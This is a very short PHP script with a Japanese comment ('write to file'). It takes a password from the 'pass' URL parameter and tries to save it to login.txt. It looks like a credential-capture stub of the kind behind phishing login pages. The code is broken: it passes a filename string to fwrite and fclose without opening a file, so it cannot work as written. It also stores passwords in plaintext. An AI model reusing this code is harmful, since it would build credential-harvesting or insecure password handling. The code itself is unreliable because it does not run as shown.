<?php
$data = $_GET["pass"];
$file = 'login.txt';
fwrite( $file, $data);     //ファイルへの書込み
fclose( $file );
?>
